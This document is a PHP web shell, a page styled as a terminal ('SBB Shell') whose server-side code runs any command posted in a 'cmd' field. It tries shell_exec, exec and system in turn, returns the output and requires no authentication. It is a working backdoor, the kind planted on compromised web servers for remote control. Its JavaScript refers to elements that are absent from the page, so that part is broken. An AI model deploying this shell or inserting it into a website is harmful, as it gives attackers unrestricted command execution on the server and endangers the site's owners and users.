<!DOCTYPE html>
<html>
<head>
	<title>PHP Shell</title>
	<style type="text/css">
		body {
        background: rgba(0,0,0,0.5);
        display: grid;
        place-items: center;
        min-height: 100vh;
        }

        .terminal-window {
            text-align: left;
            width: 600px;
            height: 460px;
            border-radius: 10px 10px 0 0;
            position: relative;
            box-shadow: 0 0 5px 1px rgb(40, 42, 54);
            margin: 0 auto;
        }

        .terminal-header {
            background: #e0e8f0;
            height: 30px;
            border-radius: 8px 8px 0 0;
            padding-left: 10px;
        }

        .terminal-button {
            width: 12px;
            height: 12px;
            margin: 10px 4px 0 0;
            display: inline-block;
            border-radius: 50%;
        }

        .green {
            background: #3bb662;
        }

        .yellow {
            background: #e5c30f;
        }

        .red {
            background: #e75448;
        }

        .terminal-body {
            color: white;
            font-family: Menlo, Monaco, "Consolas", monospace, "Courier New", "Courier";
            font-size: 11pt;
            background: #30353a;
            opacity: 0.9;
            padding: 10px;
            box-sizing: border-box;
            position: absolute;
            width: 100%;
            top: 30px;
            bottom: 0;
            overflow: auto;
            overflow-x: hidden;
        }

        .terminal-body form {
            display: inline-block;
        }

        .terminal-body form > textarea {
            background-color: transparent;
            border:0;
            color:white;
            width: 100%;
            min-height: 460px;
        }

        .terminal-body form > textarea:focus {
            border:none;
            outline: none;
        }

	</style>
</head>
<body>
	

    <?php
        if (isset($_POST['cmd'])) {
            $cmd = $_POST['cmd'];
            if (function_exists('shell_exec')) {
                $output = shell_exec($cmd);
            } elseif (function_exists('exec')) {
                exec($cmd, $output);
                $output = implode("\n", $output);
            } elseif (function_exists('system')) {
                ob_start();
                system($cmd);
                $output = ob_get_contents();
                ob_end_clean();
            } else {
                $output = 'Command execution not possible.';
            }
            echo $output;
        }
    ?>


    <div class="terminal-window">
        <div class="terminal-header">
            <div class="terminal-button green"></div>
            <div class="terminal-button yellow"></div>
            <div class="terminal-button red"></div>
            <span>SBB Shell</span>
        </div>
        <div class="terminal-body">
            <span class="prompt">
                <span>$</span>
                <form>
                    <textarea type="text" name="cmd"></textarea>
                </form>
            </span>
        </div>
    </div>

    <script>
		const terminal = document.querySelector('.terminal');
		const inputLine = document.querySelector('.input-line');
		const cmdLine = document.querySelector('.cmd');
		const output = document.querySelector('.output');

		cmdLine.addEventListener('keydown', function(e) {
			if (e.keyCode === 13) { // Enter key pressed
				const cmd = cmdLine.value;
				if (cmd) {
					output.innerHTML += '<p class="command">' + cmd + '</p>';
					fetch('shell.php', {
						method: 'post',
						body: new FormData(document.querySelector('form'))
					}).then(function(response) {
						return response.text();
					}).then(function(data) {
						output.innerHTML += '<pre>' + data + '</pre>';
					});
					cmdLine.value = '';
				}
			}
		});
	</script>
</body>
</html>